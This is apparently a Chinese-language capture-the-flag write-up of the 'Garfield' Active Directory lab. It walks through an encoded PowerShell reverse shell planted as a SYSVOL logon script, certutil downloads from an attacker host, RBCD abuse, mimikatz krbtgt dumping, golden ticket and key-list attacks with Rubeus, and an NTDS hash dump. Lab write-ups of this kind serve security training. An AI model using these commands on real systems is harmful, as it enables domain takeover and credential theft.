<h2 id="garfield">Garfield</h2>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234837522-550731750.png" alt="image-20260407123450025" loading="lazy"></p>
<h3 id="信息收集">信息收集</h3>
<pre><code class="language-kotlin">┌──(root㉿kali)-[~]
└─# nmap -A -T4 10.129.83.35
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 00:38 -0400
Nmap scan report for 10.129.83.35

</code></pre>
<p><strong>系统</strong>：高度疑似 <strong>Windows Server 2019 / Windows 10</strong>（版本 10.0.17763）</p>
<p><strong>域名环境</strong>：域控制器 <strong>DC01.garfield.htb</strong>，域名 <strong>garfield.htb</strong>，域名为 GARFIELD</p>
<p>开放了大量典型 <strong>Windows 域控（AD）</strong> 端口：</p>
<ul>
<li>53：DNS</li>
<li>88：Kerberos</li>
<li>135、139、445：RPC / SMB</li>
<li>389、636：LDAP / LDAPS</li>
<li>464：Kerberos 密码修改</li>
<li>593、3268、3269：AD 相关服务</li>
<li>3389：RDP 远程桌面</li>
<li>5985：WinRM（HTTP 管理）</li>
</ul>
<p>目标是一台 <strong>Active Directory 域控制器（DC）</strong></p>
<p><strong>SMB 签名已启用且强制开启</strong>，常规 SMB Relay 攻击难度较大</p>
<p>RDP 证书信息、NTLM 信息泄露了主机名、域名、系统版本</p>
<p>大量端口被防火墙过滤，仅开放域服务端口</p>
<p>系统时间与本地存在约 <strong>8 小时时差</strong></p>
<p>针对SMB服务，可以使用NetExec使用提供的用户凭据枚举目标主机上的 SMB 共享目录，并列出权限</p>
<pre><code>nxc smb 10.129.83.35 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
nxc smb 10.129.83.35 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234838171-1926289656.png" alt="image-20260408140707416" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234838606-254321880.png" alt="image-20260408145709671" loading="lazy"></p>
<p>可以发现有l.wilson和l.wilson_adm</p>
<p>我们再去列出当前用户能 “写入 / 修改” 的所有域对象</p>
<p>使用bloodyAD</p>
<pre><code class="language-kotlin">bloodyAD --host 10.129.195.195 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234839012-2145208861.png" alt="image-20260408150229331" loading="lazy"></p>
<p>可以发现l.wilson和l.wilson_adm有可写权限，说明可以修改这个两个用户的账户，包括重置密码、修改权限、添加到管理员组等</p>
<p>同时可以看到garfield.htb和_msdcs.garfield.htb有可创建子对象的权限，拥有<strong>域 DNS 区域的创建子记录权限</strong>，这是<strong>域内最经典的提权漏洞：DNS 记录篡改（ADIDNS/WPAD 劫持）</strong></p>
<p>尝试去修改密码</p>
<pre><code class="language-kotlin">bloodyAD --host 10.129.195.195 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set password l.wilson 'NewPass@123!'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234839328-1106684450.png" alt="image-20260408151750110" loading="lazy"></p>
<p>当前用户 <code>j.arbuckle</code> 对目标对象 <code>CN=Liz Wilson ADM</code> 只有<strong>通用的写入权限（WRITE）</strong>，但<strong>没有修改密码的特定权限（User-Change-Password）</strong>。</p>
<p>这条路不行，我们当前的环境是<code>garfield.htb</code>域，已经拿到了普通域用户<code>j.arbuckle</code>的权限，并且</p>
<ul>
<li>拥有<code>SYSVOL</code>共享的读权限</li>
<li>对域内用户/对象有写入权限，且域内存在打印机服务相关的组策略配置</li>
</ul>
<pre><code class="language-kotlin">smbclient //10.129.195.195/SYSVOL -U 'j.arbuckle'
# 连接SYSVOL共享，遍历scripts目录
cd garfield.htb\scripts
# 进入脚本目录（域内登录脚本默认路径）
ls
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234839680-245267847.png" alt="image-20260408153501894" loading="lazy"></p>
<p><strong>把恶意脚本写入组策略登录脚本目录，让域内主机（包括域控）在登录 / 服务启动时自动执行，从而拿到反向 Shell</strong>。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p><strong>生成powershell反向壳有效载荷</strong></p>
<pre><code class="language-kotlin">echo '$client = New-Object System.Net.Sockets.TCPClient("'"10.10.16.6"'",9001);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2&gt;&amp;1|Out-String);
$sendback2=$sendback+"PS "+(pwd).Path+"&gt; ";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234840042-791915958.png" alt="image-20260408155349750" loading="lazy"></p>
<p><strong>构建.bat文件</strong></p>
<pre><code class="language-kotlin">cat &gt; printerDetect.bat &lt;&lt; 'EOF'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc &lt;BASE64_PAYLOAD&gt;
EOF
</code></pre>
<p><strong>上传批处理文件</strong></p>
<pre><code class="language-kotlin">smbclient //10.129.195.195/SYSVOL -U 'j.arbuckle'

内部：smbclient
cd garfield.htb\scripts
put printerDetect.bat printerDetect.bat
dir
exit
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234840438-1597143445.png" alt="image-20260408160316896" loading="lazy"></p>
<p><strong>开始触发</strong></p>
<p>给用户 <code>Liz Wilson</code> 设置一个「登录自动执行的脚本」：<code>printerDetect.bat</code></p>
<pre><code class="language-kotlin">bloodyAD --host 10.129.195.195 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
scriptPath -v printerDetect.bat
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234840767-878985637.png" alt="image-20260408160755280" loading="lazy"></p>
<p>得到shell</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234841079-287219993.png" alt="image-20260408160824578" loading="lazy"></p>
<h3 id="横向移动">横向移动</h3>
<p>目前我们是l.wilson，我们现在要变成l.wilson_adm</p>
<p><strong>从powershell中去重置l.wilson_adm的密码</strong></p>
<pre><code class="language-kotlin">Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
</code></pre>
<p><strong>验证WinRM访问</strong></p>
<pre><code>nxc winrm 10.129.195.195 -u 'l.wilson_adm' -p 'WhoKnows123!'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234841421-1296434726.png" alt="image-20260408161531730" loading="lazy"></p>
<p>说明修改成功</p>
<p><strong>获得shell</strong></p>
<pre><code class="language-kotlin">evil-winrm -i 10.129.195.195 -u l.wilson_adm -p 'WhoKnows123!'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234841761-1903017158.png" alt="image-20260408161804741" loading="lazy"></p>
<h3 id="提权">提权</h3>
<p>信息收集</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234842089-1900128686.png" alt="image-20260410191249747" loading="lazy"></p>
<p>存在RODC01.garfield.htb</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234842400-471772865.png" alt="image-20260410191331095" loading="lazy"></p>
<p>ip为192.168.100.2，然后自己是DC01.garfield.htb，ip为192.168.100.1</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234842709-1338959219.png" alt="image-20260410181718181" loading="lazy"></p>
<p>可以看到拥有SeMachineAccountPrivilege</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234843095-68638594.png" alt="image-20260410181922038" loading="lazy"></p>
<p>且是<strong>GARFIELD\Tier 1 组</strong> 成员，属于域内服务器 / RODC 的管理员</p>
<p><strong>将自己添加到RODC Administrators</strong></p>
<ul>
<li>Tier1 管理员天然拥有该组的管理权限，可直接添加自己，无需提权</li>
<li>加入后可修改 RODC 的密码复制策略，缓存域管凭证，直接拿域控权限</li>
<li>该组是 AD 标准管理组，成员添加操作默认不触发告警，属于防御盲区</li>
</ul>
<pre><code class="language-kotlin">Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
</code></pre>
<p><strong>端口转发，建立隧道</strong></p>
<p>在kali上部署ligolo-ng服务器</p>
<pre><code class="language-kotlin"># 下载工具
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
# 解压
tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
# 创建TUN虚拟网卡ligolo
sudo ip tuntap add user root mode tun ligolo
# 启动网卡
sudo ip link set ligolo up
# 启动代理服务端，监听0.0.0.0:11601，使用自签名证书
./proxy -selfcert -laddr 0.0.0.0:11601
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234843459-665970667.png" alt="image-20260410183825445" loading="lazy"></p>
<p>在WinRM中运行agent客户端</p>
<p>agent客户端从https://github.com/nicocha30/ligolo-ng/releases这里下载</p>
<p>然后传入winrm中</p>
<pre><code class="language-kotlin">kali起一个http服务

Invoke-WebRequest -Uri "http://10.10.16.9:80/agent.exe" -OutFile "agent.exe"
</code></pre>
<p>运行agent.exe</p>
<pre><code class="language-kotlin">.\agent.exe -connect 10.10.16.9:11601 -ignore-cert
</code></pre>
<pre><code class="language-kotlin">在kali中

sudo ip addr add 10.10.16.9/23 dev ligolo
sudo ip route add 192.168.100.0/24 dev tun1

在ligolo交互界面中
# 1. 查看在线Agent（确认ID）
ligolo-ng &gt; session
# 输出会显示Agent列表，ID一般为1

# 2. 选中Agent（用ID，这里是1）
ligolo-ng &gt; session 1
# 输出：[+] Agent selected: 1

# 3. 启动隧道（核心！必须执行）
ligolo-ng &gt; start
# 输出：[+] Tunnel started for agent 1
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234843796-252499978.png" alt="image-20260410190830073" loading="lazy"></p>
<p><strong>访问RODC01</strong></p>
<pre><code class="language-kotlin">nxc smb 192.168.100.2 -u l.wilson_adm -p 'WhoKnows123!'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234844128-1375099947.png" alt="image-20260410191552843" loading="lazy"></p>
<p><strong>创建一个fake账户</strong></p>
<p>目前用户已经加入了RODC administrator组，在AD中新建一个可控的计算机账户</p>
<p>AD 中机器账户默认拥有<code>SeMachineAccountPrivilege</code>，可以修改自己的委派属性，且默认审计宽松，不易被发现</p>
<pre><code class="language-kotlin">impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
-computer-name 'FAKE$' \
-computer-pass 'FakePass123!' \
-dc-ip 10.129.196.71
</code></pre>
<p>我们验证一下</p>
<pre><code class="language-kotlin">nxc ldap 10.129.196.71 -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234844499-1319228064.png" alt="image-20260410192107117" loading="lazy"></p>
<p><strong>给<code>FAKE$</code>配置对<code>RODC01</code>的RBCD权限</strong></p>
<p>在WinRM中设置委托</p>
<pre><code class="language-kotlin">Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234844845-2041472494.png" alt="image-20260410193249343" loading="lazy"></p>
<p>RBCD配置成功</p>
<p><strong>冒充RODC01管理员</strong></p>
<p>请求服务票</p>
<pre><code class="language-kotlin">impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
-spn cifs/RODC01.garfield.htb \
-impersonate Administrator \
-dc-ip 10.129.196.71

在这之前要统一时间
ntpdate 10.129.196.71
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234845168-1327767096.png" alt="image-20260410203038774" loading="lazy"></p>
<p>出口票</p>
<pre><code class="language-kotlin">export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
echo $KRB5CCNAME
</code></pre>
<p>获取system到RODC01</p>
<pre><code class="language-kotlin">impacket-psexec -k -no-pass \
-dc-ip 10.129.196.71 \
-target-ip 192.168.100.2 \
garfield.htb/Administrator@RODC01.garfield.htb
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234845507-1900266404.png" alt="image-20260410203318224" loading="lazy"></p>
<p><strong>导出AES256密钥<code>krbtgt_8245</code></strong></p>
<p>为后续黄金票据（Golden Ticke）攻击做准备</p>
<p>Kali 侧搭建 HTTP 服务，托管 mimikatz</p>
<pre><code class="language-kotlin">cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
cd /tmp
python3 -m http.server 8888
</code></pre>
<p>下载Mimikatz在RODC01上</p>
<pre><code class="language-kotlin">cd C:\Windows\Temp
certutil -urlcache -split -f http://10.10.16.9:80/mimikatz.exe mimikatz.exe
mimikatz.exe
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234845891-2008204915.png" alt="image-20260410222603608" loading="lazy"></p>
<p>Mimikatz内部：</p>
<pre><code class="language-kotlin">privilege::debug
# 1. 提升debug权限（SYSTEM用户必须执行，否则无法读取LSASS内存）

lsadump::lsa /inject /name:krbtgt_8245
# 2. 注入lsass进程，导出krbtgt账户的凭证（指定/name:krbtgt_8245是为了精准提取）
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234846250-1270534342.png" alt="image-20260410222829995" loading="lazy"></p>
<pre><code>AES256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
SID:S-1-5-21-2502726253-3859040611-225969357
RODC编号 8245
</code></pre>
<p><strong>在WinRM加载PowerView</strong></p>
<pre><code class="language-kotlin">cd /usr/share/windows-resources/powersploit/Recon/
python3 -m http.server 8888
</code></pre>
<p>在WinRM上（下载并加载 PowerView）</p>
<pre><code class="language-kotlin">cd C:\Users\l.wilson_adm\Desktop
certutil -urlcache -split -f http://10.10.16.9:80/PowerView.ps1 PowerView.ps1
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-Command *DomainObject*
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234846638-145606578.png" alt="image-20260410224154876" loading="lazy"></p>
<pre><code class="language-kotlin">Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'

Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
</code></pre>
<table>
<thead>
<tr>
<th style="text-align: left">属性名</th>
<th style="text-align: left">作用</th>
<th style="text-align: left">操作目的</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left"><code>msDS-RevealOnDemandGroup</code></td>
<td style="text-align: left"><strong>允许 RODC 缓存密码的用户 / 组</strong></td>
<td style="text-align: left">把 <code>Administrator</code> 手动加入允许列表，让 RODC 缓存管理员的密码哈希 / AES 密钥</td>
</tr>
<tr>
<td style="text-align: left"><code>msDS-NeverRevealGroup</code></td>
<td style="text-align: left"><strong>禁止 RODC 缓存密码的用户 / 组</strong>（默认包含域管理员组）</td>
<td style="text-align: left">清空这个属性，删除管理员的「禁止缓存」限制</td>
</tr>
<tr>
<td style="text-align: left"><code>Get-ADComputer</code></td>
<td style="text-align: left">验证属性修改结果</td>
<td style="text-align: left">确认 RODC 的 PRP 已成功修改</td>
</tr>
</tbody>
</table>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234847088-1381164266.png" alt="image-20260410224335956" loading="lazy"></p>
<p><strong>金票+Keylist攻击</strong></p>
<p>Rubeus 是 C# 编写的 <strong>Windows 平台 Kerberos 攻击神器</strong>，是红队域渗透的「瑞士军刀」，核心功能包括：</p>
<ul>
<li>黄金票据 / 白银票据伪造</li>
<li>票据抓取（Pass-the-Ticket）</li>
<li>票据传递（Pass-the-Key）</li>
<li>AS-REP  roasting、Kerberoasting</li>
<li>票据缓存操作、权限提升</li>
<li>配合 krbtgt 密钥做域内完全控制</li>
</ul>
<pre><code>kali:
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
cd /tmp
python3 -m http.server 8888
</code></pre>
<p>在WinRM中</p>
<pre><code>certutil -urlcache -split -f http://10.10.16.9:80/Rubeus.exe Rubeus.exe
dir Rubeus.exe
.\Rubeus.exe
</code></pre>
<p>使用Rubeus伪造TGT票据</p>
<pre><code class="language-kotlin">.\Rubeus.exe golden `
/rodcNumber:8245 `
/flags:forwardable,renewable,enc_pa_rep `
/nowrap `
/outfile:ticket.kirbi `
/aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
/user:Administrator `
/id:500 `
/domain:garfield.htb `
/sid:S-1-5-21-2502726253-3859040611-225969357
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234847520-1276348527.png" alt="image-20260410224925831" loading="lazy"></p>
<p>再进行keylist攻击</p>
<pre><code class="language-kotlin">.\Rubeus.exe asktgs `
/enctype:aes256 `
/keyList `
/service:krbtgt/garfield.htb `
/dc:DC01.garfield.htb `
/ticket:ticket_2026_04_10_22_51_40_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
/nowrap
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234848013-322495559.png" alt="image-20260410225107305" loading="lazy"></p>
<p>得到base64</p>
<pre><code class="language-kotlin">
</code></pre>
<p>将base64 记录在kali本地</p>
<pre><code class="language-kotlin">sed -i 's/^[[:space:]]*//' ticket.b64
tr -d '\r\n\t ' &lt; ticket.b64 | base64 -d &gt; ticket.kirbi
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234848402-1834034701.png" alt="image-20260410225437053" loading="lazy"></p>
<pre><code class="language-kotlin"># 1. 用Impacket的ticketConverter工具，把.kirbi转换成.ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# 2. 导出环境变量，让Impacket工具自动使用这个票据
export KRB5CCNAME=ticket.ccache

# 3. 验证环境变量生效
echo $KRB5CCNAME
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234848725-39781851.png" alt="image-20260410225551795" loading="lazy"></p>
<p>用真实管理员票弃掉NTDS</p>
<pre><code class="language-kotlin">nxc smb DC01.garfield.htb --use-kcache --ntds
</code></pre>
<p><strong>最终得到管理员</strong></p>
<pre><code class="language-kotlin">evil-winrm -i 10.129.196.71 -u Administrator -H 'ee238f6debc752010428f20875b092d5'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234849101-1320246479.png" alt="image-20260410231605892" loading="lazy"></p>


</div>
